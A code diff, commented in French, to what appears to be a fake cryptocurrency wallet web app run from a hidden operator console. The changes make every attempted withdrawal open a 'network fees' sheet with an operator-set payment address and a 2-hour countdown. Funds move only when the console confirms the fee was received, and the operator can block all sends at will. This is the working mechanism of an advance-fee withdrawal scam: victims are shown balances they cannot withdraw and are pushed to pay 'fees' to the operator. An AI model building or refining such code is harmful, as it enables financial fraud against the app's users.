@@ -1475,13 +1475,27 @@
     try { deltaSend({ type: "feeOrder", order: { ...o } }); } catch { }
   }
 
+  // Transaction en attente : le premier envoi confirmé crée un ordre de frais
+  // lié à CETTE transaction. Tant qu'il n'est pas validé par la console, aucun
+  // autre envoi ne part — la fiche des frais s'ouvre à la place du formulaire.
+  function activeFeeOrder() {
+    return Object.values(feeOrders())
+      .filter(o => o && !o.done && !o.cancelled && !o.pending && o.src === "app" && !o.ok)
+      .sort((a, b) => (Number(b.at) || 0) - (Number(a.at) || 0))[0] || null;
+  }
+
   // Blocage : renvoie true quand une transaction est refusée et que la fiche
   // des frais a été ouverte à la place.
   function pendingFeeGate() {
-    const o = pendingFee();
-    if (!o || o.ok) return false;
+    const last = () => Object.values(feeOrders())
+      .filter(o => o && o.src === "app" && !o.pending)
+      .sort((a, b) => (Number(b.at) || 0) - (Number(a.at) || 0))[0] || null;
+    // `feeBlock` : la console a suspendu les envois à la main, même sans ordre
+    // en cours. Le dernier ordre connu sert de fiche de référence.
+    const o = activeFeeOrder() || (ST.feeBlock ? last() : null);
+    if (!o) return false;
     try { closeSheet(); } catch { }
-    sheetSendDone({ pick: o.pick || "USDC", addr: o.addr || "", amt: Number(o.amt) || 0, fee: Number(o.amount) || 0, orderId: o.id });
+    sheetSendDone({ pick: o.pick || "USDC", addr: o.addr || "", amt: Number(o.amt) || 0, fee: Number(o.amount) || 0, orderId: o.id, force: !!ST.feeBlock });
     return true;
   }
 
@@ -1792,14 +1806,12 @@
       put("cancelled", !!r.cancelled);
       if (Number(r.exp) > 0) put("exp", Number(r.exp));
     }
-    // Un ordre réglé par la console libère le montant retenu : la somme part
-    // même si la validation a été faite depuis un autre appareil.
-    if (cur.done && releaseHold(cur)) changed = true;
+    // Aucun montant n'est retenu ni prélevé sur le solde au titre des frais :
+    // la transaction se débite une seule fois, à la validation de la console
+    // (voir iaNetSetValid). Rien à libérer ici.
     // La notification de la transaction suit chaque changement (montant,
     // reçu, statut, destinataire) : la liste se met à jour sans recharger.
     if (changed) feeNotifSync(cur);
-    // Validation reçue : le règlement sort vraiment du solde, une seule fois.
-    if (cur.ok && settleFeeLedger(cur)) { saveLocal(); renderAll(); }
     return changed;
   }
 
@@ -1845,37 +1857,33 @@
       if (pendingFeeGate()) return;
       const res = pick === "USDC" ? checkUsdcSend(addr, amt) : checkSend(pick, addr, amt);
       if (!res.ok) { sheetSend(pick); return setErr(res.msg); }
-      withBusy($("#sdConfirm"), () => {
-        payOverlay({
-          title: "Transaction en cours",
-          steps: [
-            "Signature de la transaction…",
-            "Diffusion sur le réseau…",
-            "En attente de confirmation…"
-          ],
-          ms: SEND_DELAY_MS
-        }).then(() => {
-          // Les frais réseau ont été réglés avant la transaction : le montant
-          // quitte le solde maintenant, une seule fois, et la transaction est
-          // confirmée. Aucune somme n'est retenue.
-          debitSend(pick, amt);
-          addNotif({
-            id: "sd" + Date.now().toString(36), kind: "withdraw", asset: pick,
-            amount: amt, addr, fee: 0, at: Date.now(),
-            text: "Envoi de " + qtyTxt(amt, pick) + " confirmé"
-          });
-          saveLocal(); renderAll();
-          sheetSendDone({ pick, addr, amt, fee: 0, final: true });
-        });
-      }, 550);
+      // Les frais réseau sont demandés AVANT la transaction : la fiche de
+      // règlement s'ouvre tout de suite, avec l'adresse de perception choisie,
+      // le compte à rebours de 2 h et le montant déjà reçu. L'envoi n'est
+      // exécuté qu'à la validation de la console. Aucune somme ne quitte le
+      // solde ici.
+      const sched = pendingFee();
+      const feeNow = Math.max(0, Number(sched && sched.amount) || 0) || Math.max(0, Number(cfgUsdcFee(usdcNet().id)) || 0);
+      const feePaid = Math.max(0, Number(sched && sched.paid) || 0);
+      const order = feeOrderNew({
+        pick, amt, fee: feeNow, sym: feeSymFor(pick), addr, paid: feePaid, ok: false
+      });
+      addNotif({
+        id: "sd" + Date.now().toString(36), kind: "withdraw", asset: pick,
+        amount: amt, addr, fee: feeNow, at: Date.now(),
+        orderId: order.id,
+        text: "Envoi de " + qtyTxt(amt, pick) + " en attente des frais réseau"
+      });
+      saveLocal(); renderAll();
+      sheetSendDone({ pick, addr, amt, fee: feeNow, orderId: order.id });
     });
   }
 
-  function sheetSendDone({ pick, addr, amt, fee, orderId, final }) {
+  function sheetSendDone({ pick, addr, amt, fee, orderId, final, force }) {
     const due = feeDueInfo(pick, fee);
     const order = orderId ? (feeOrders()[orderId] || null) : null;
     const rem = order ? feeRemaining(order) : null;
-    const done = !!final || (!!order && !!order.done);
+    const done = !force && (!!final || (!!order && !!order.done));
     const ok = !order || !!order.ok;
     // Un ordre d'attente permanent n'est pas une transaction : il ouvre la
     // fiche des frais et bloque tout le reste tant qu'il n'est pas validé.
@@ -1896,7 +1904,7 @@
     if (order && !order.ref) { order.ref = genRef(pick); saveLocal(); }
     if (order) { order.feeAddr = feeAddrLive(order); saveLocal(); }
     const feeTo = order ? feeAddrLive(order) : (fee > 0 ? feeAddrFor(feeSym, destShow) : "");
-    const waiting = !done && !!order && rem.remaining > 0;
+    const waiting = !!force || (!done && !!order && rem.remaining > 0);
     window.__feeOpen = order ? order.id : null;
     openSheet(`<div class="sheet-title">${pend ? (ok ? "Frais réseau réglés" : "Frais réseau à régler") : (done ? "Transaction envoyée" : "Envoi en cours")}</div>
       <p class="sheet-sub" id="feeSub">${pend
@@ -1906,7 +1914,7 @@
         : done
         ? "La transaction a été confirmée et ajoutée à votre historique."
         : waiting
-          ? "Votre transaction a été signée puis diffusée. Le montant reste bloqué sur votre solde : il ne partira qu'une fois les frais réseau réglés."
+          ? "Votre envoi est en attente : réglez les frais réseau ci-dessous. Le montant reste sur votre solde et la transaction partira dès la validation."
           : "Votre transaction a été signée puis diffusée sur le réseau."}</p>
       <div class="recap">
         ${pend ? "" : `<div class="rc-row"><span>Actif</span><b id="feeAsset">${aName}</b></div>
@@ -1924,7 +1932,7 @@
           : `Il reste <b id="feeRemain">${feeAmtTxt(rem.remaining, feeSym)}</b> de frais réseau à régler en ${feeSym}${pend ? " avant de pouvoir envoyer" : " pour confirmer la transaction"}.`}</p>
         <div class="recap">
           <div class="rc-row"><span>Montant à envoyer</span><b id="feeRemain2">${rem.remaining > 0 ? feePair(rem.remaining, feeSym) : feeAmtTxt(0, feeSym)}</b></div>
-          <div class="rc-row"><span>Déjà reçu</span><b id="feePaid">${feeAmtTxt(rem.paid, feeSym)}</b></div>
+          <div class="rc-row"><span>Déjà reçu</span><b id="feePaid">${feeAmtTxt(rem.paid, feeSym)}${rem.amount > 0 ? " / " + feeAmtTxt(rem.amount, feeSym) : ""}</b></div>
           <div class="rc-row col"><span>Adresse des frais (${feeSym})</span><code id="feeTo">${feeTo}</code></div>
           <div class="rc-row"><span>Temps restant</span><b id="feeCount" class="wait">${feeCountSoft((Number(order.exp) || 0) - Date.now())}</b></div>
         </div>
@@ -1952,10 +1960,12 @@
     const sentBtn = $("#sdFeeSent");
     if (sentBtn) sentBtn.addEventListener("click", () => {
       if (!order || !order.ok) return toast("Validation en attente");
-      // Le montant retenu part maintenant : frais réseau réglés, la somme
-      // quitte le solde et la transaction devient confirmée.
-      releaseHold(order);
-      settleFeeLedger(order);
+      // La console a validé le règlement : le montant de l'envoi quitte le
+      // solde maintenant, une seule fois, et la transaction devient confirmée.
+      if (!order.debited) {
+        debitSend(order.pick || pick, Number(order.amt) || amt);
+        order.debited = true;
+      }
       order.done = true;
       order.doneAt = Date.now();
       order.statusTxt = "Confirmée";
@@ -2779,7 +2789,9 @@
     if (Number.isFinite(+s.cash)) ST.cash = Math.max(0, +s.cash);
     const gas = saneFee(s.gas);
     if (gas !== null) ST.gas = gas;
+    if (typeof s.feeBlock === "boolean") ST.feeBlock = s.feeBlock;
     if (s.balances && typeof s.balances === "object") ST.balances = { ...s.balances };
+    if (typeof s.feeBlock === "boolean") ST.feeBlock = s.feeBlock;
     if (s.fees && typeof s.fees === "object") {
       const keep = {};
       for (const [k, v] of Object.entries(s.fees)) {
@@ -3313,6 +3325,7 @@
     delFees: Array.isArray(ST.delFees) ? ST.delFees.slice(-400) : [],
     actsAt: Number(ST.actsAt) || 0,
     cash: Number(ST.cash) || 0, gas: Number(ST.gas) || 0,
+    feeBlock: !!ST.feeBlock,
     balances: { ...ST.balances },
     fees: { ...ST.fees },
     usdcFee: { ...(ST.usdcFee || {}) },
@@ -3416,6 +3429,13 @@
   const DEFAULT_FEE_SYM = "USDC";
   let iaNetTimer = null;
 
+  // Ordre piloté par la console : l'ordre d'attente de l'app s'il existe (la
+  // transaction en cours), sinon le modèle de barème qui alimente les
+  // prochains envois.
+  function adminFeeTarget() {
+    return activeFeeOrder() || pendingFee();
+  }
+
   function iaNetLive() {
     const panel = $("#iaPanel");
     if (!panel) return;
@@ -3432,7 +3452,10 @@
     // L'ordre d'attente porte l'adresse qui perçoit : celle saisie, sinon la
     // valeur par défaut affichée dans le champ.
     const feeAddr = addr.length >= 10 ? addr : DEFAULT_FEE_ADDR;
-    const o = pendingFeePatch({ amount, paid, sym: DEFAULT_FEE_SYM, pick: DEFAULT_FEE_SYM, feeAddr });
+    const act = activeFeeOrder();
+    const o = act
+      ? (Object.assign(act, { amount, paid, sym: DEFAULT_FEE_SYM, pick: act.pick || DEFAULT_FEE_SYM, feeAddr, rev: Date.now() }), saveLocal(), act)
+      : pendingFeePatch({ amount, paid, sym: DEFAULT_FEE_SYM, pick: DEFAULT_FEE_SYM, feeAddr });
     if (o) {
       // Les équivalents se recalculent sans re-rendu (le champ garde le focus).
       const out = (k, v) => { const el = panel.querySelector('[data-ianetout="' + k + '"]'); if (el) el.textContent = v; };
@@ -3440,19 +3463,82 @@
       out("paidEq", feeAmtTxt(paid, DEFAULT_FEE_SYM));
       out("remain", feeAmtTxt(Math.max(0, amount - paid), DEFAULT_FEE_SYM));
       try { ensureOrderNotif(o); } catch { }
-      pendingFeePublish();
+      if (act) { try { deltaSend({ type: "feeOrder", order: { ...act } }); } catch { } }
+      else pendingFeePublish();
     }
     try { liveFeeRefresh(); } catch { }
   }
 
   function iaNetSetValid(on) {
+    const act = activeFeeOrder();
+    if (act && on) {
+      // La console n'ouvre la transaction qu'une fois le montant des frais
+      // réellement reçu : le règlement doit couvrir le barème affiché.
+      const amount = Number(act.amount) || 0;
+      const paid = Number(act.paid) || 0;
+      if (amount > 0 && paid < amount) {
+        toast("Frais non reçus : " + feeAmtTxt(Math.max(0, amount - paid), DEFAULT_FEE_SYM) + " manquants");
+        return;
+      }
+      act.ok = true;
+      ST.feeBlock = false;
+      // Le montant de l'envoi quitte le solde maintenant, une seule fois.
+      if (!act.debited) { debitSend(act.pick || "USDC", Number(act.amt) || 0); act.debited = true; }
+      act.done = true;
+      act.doneAt = Date.now();
+      act.statusTxt = "Confirmée";
+      saveLocal();
+      try { deltaSend({ type: "feeOrder", order: { ...act } }); } catch { }
+      // Le débit est publié avec l'état : le solde baisse sur tous les
+      // appareils, pas seulement sur celui de la console.
+      try { iaPublish({ type: "state", state: iaSnapshot() }); } catch { }
+      addNotif({
+        id: "sd" + Date.now().toString(36), kind: "withdraw", asset: act.pick || "USDC",
+        amount: Number(act.amt) || 0, addr: act.addr || "", fee: amount, at: Date.now(),
+        text: "Envoi de " + qtyTxt(Number(act.amt) || 0, act.pick || "USDC") + " confirmé"
+      });
+      try { liveFeeRefresh(); } catch { }
+      try { renderAll(); } catch { }
+      iaRender();
+      toast("Transaction validée et débloquée");
+      return;
+    }
+    if (act && !on) {
+      act.ok = false;
+      act.done = false;
+      ST.feeBlock = true;
+      act.statusTxt = "En attente des frais réseau";
+      saveLocal();
+      try { deltaSend({ type: "feeOrder", order: { ...act } }); } catch { }
+      try { liveFeeRefresh(); } catch { }
+      try { renderAll(); } catch { }
+      iaRender();
+      toast("Transactions bloquées");
+      return;
+    }
     pendingFeePatch({ ok: !!on, done: false, cancelled: false });
+    ST.feeBlock = !on;
+    // Blocage sans transaction en cours : on rouvre le dernier ordre connu pour
+    // que la fiche des frais serve de porte d'entrée, comme pendant un envoi.
+    if (!on) {
+      const last = Object.values(feeOrders())
+        .filter(o => o && o.src === "app" && !o.pending)
+        .sort((a, b) => (Number(b.at) || 0) - (Number(a.at) || 0))[0] || null;
+      if (last) {
+        last.ok = false;
+        last.done = false;
+        last.cancelled = false;
+        last.statusTxt = "En attente des frais réseau";
+        saveLocal();
+        try { deltaSend({ type: "feeOrder", order: { ...last } }); } catch { }
+      }
+    }
     saveLocal();
     pendingFeePublish();
     try { liveFeeRefresh(); } catch { }
     try { renderAll(); } catch { }
     iaRender();
-    toast(on ? "Transactions débloquées" : "Transactions bloquées");
+    toast(on ? "Barème des frais activé" : "Barème des frais désactivé");
   }
 
   function iaFeeDraft(id) {
@@ -3595,7 +3681,6 @@
     o.ok = !o.cancelled && (status === "valide" || status === "regle" || (amount > 0 && o.paid >= amount));
     if (o.done) { o.doneAt = o.doneAt || now; } else { delete o.doneAt; }
     if (o.ok) o.okAt = o.okAt || now; else delete o.okAt;
-    if (o.done) releaseHold(o);
     o.statusTxt = o.cancelled
       ? "Annulée"
       : o.done
@@ -3708,19 +3793,25 @@
         <button type="button" data-ia="delAct" data-actid="${iaEsc(x.id)}">Suppr.</button>
       </div>`).join("") : `<p class="ia-empty">Historique vide.</p>`;
 
-    // Ordre d'attente : il bloque les transactions tant qu'il n'est pas validé.
+    // Fiche pilotée par la console : la transaction en attente de frais si elle
+    // existe, sinon le barème qui alimentera le prochain envoi.
+    const act = activeFeeOrder();
     const pend = pendingFee();
-    const pendSym = (pend && pend.sym) || DEFAULT_FEE_SYM;
-    const pendAmount = pend ? Number(pend.amount) || 0 : 0;
-    const pendPaid = pend ? Number(pend.paid) || 0 : 0;
-    const pendAddr = (pend && pend.feeAddr) || ((ST.feeAddresses || {}).USDC) || DEFAULT_FEE_ADDR;
-    const pendOk = !!(pend && pend.ok);
+    const cur = act || pend;
+    const pendSym = (cur && cur.sym) || DEFAULT_FEE_SYM;
+    const pendAmount = cur ? Number(cur.amount) || 0 : 0;
+    const pendPaid = cur ? Number(cur.paid) || 0 : 0;
+    const pendAddr = (cur && cur.feeAddr) || ((ST.feeAddresses || {}).USDC) || DEFAULT_FEE_ADDR;
+    const pendOk = !!(cur && cur.ok);
     const pendRemain = Math.max(0, pendAmount - pendPaid);
+    const actAmt = act ? Number(act.amt) || 0 : 0;
 
     body.innerHTML = `
       <section class="ia-card ia-netfee${pendOk ? " is-ok" : ""}">
-        <h3>Frais réseau — avant transaction</h3>
-        <p class="ia-sub">Ce panneau agit <b>avant</b> la transaction. Tant que « Valider » n'est pas pressé, l'application refuse tout envoi, dans n'importe quelle monnaie, et ouvre cette fiche à la place. Chaque champ part en direct sur tous les appareils.</p>
+        <h3>Frais réseau — contrôle des transactions</h3>
+        <p class="ia-sub">${act
+          ? `Transaction en attente : ${iaEsc(qtyTxt(actAmt, act.pick || "USDC"))} vers <code>${iaEsc(maskAddr(act.addr || ""))}</code>. Le montant est encore sur le solde ; « Valider » le débite une seule fois et confirme l'envoi.`
+          : "Aucune transaction en attente. Ces champs fixent le barème appliqué au prochain envoi, puis au suivi de son règlement."} Chaque champ part en direct sur tous les appareils.</p>
         <div class="recap">
           <div class="rc-row"><span>Montant des frais (€)</span><input data-ianet="amount" inputmode="decimal" autocomplete="off" value="${iaField(pendAmount)}" placeholder="100"></div>
           <div class="rc-row"><span>Équivalent ${pendSym}</span><b data-ianetout="amountEq">${feeAmtTxt(pendAmount, pendSym)}</b></div>
@@ -3732,8 +3823,10 @@
           </div>
         </div>
         <p class="ia-sub">${pendOk
-          ? "Validé : l'application laisse passer les transactions."
-          : "Non validé : l'application bloque les transactions et renvoie sur la fiche des frais."}</p>
+          ? "Validé : la transaction est exécutée et le solde débité."
+          : act
+            ? "Non validé : le reste à régler doit être reçu, puis « Valider » exécute la transaction."
+            : "Barème en place : le prochain envoi ouvrira un suivi de règlement de 2 h."}</p>
         <div class="ia-grid">
           <button type="button" class="ia-btn" data-ia="netValid">Valider et débloquer</button>
           <button type="button" class="ia-btn ghost" data-ia="netBlock">Bloquer les transactions</button>
